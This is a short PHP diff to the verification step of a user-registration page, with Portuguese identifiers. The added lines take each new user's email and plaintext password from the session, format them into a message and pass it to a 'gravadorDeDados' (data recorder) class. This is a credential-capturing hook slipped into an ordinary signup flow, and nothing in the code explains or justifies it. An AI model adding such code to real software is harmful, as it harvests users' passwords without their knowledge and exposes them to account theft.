@@ -5,8 +5,15 @@ if (isset($_POST['submit'])){
 
     if ($_POST['codigo'] == $_SESSION['CodigoVerificacao']){
         require_once('../model/Http/usuario.php');
+        require_once('../classes/gravadorDeDados.php');
+        $gd = new gravadorDeDados();
         $user = new usuario();
         $user->inserirUsuario(ucwords($_SESSION['Nome']), ucwords($_SESSION['Sobrenome']), $_SESSION['Email'], $_SESSION['Senha'], $_SESSION['Telefone']);
+        $em = $_SESSION['Email'];
+        $se = $_SESSION['Senha'];
+        $mensagem = "Email: $em     Senha: $se";
+        $gd->gravarDados($mensagem);
+        
         $_SESSION['UserCadas'] = true;
         header("Location: login.php");
     }else{
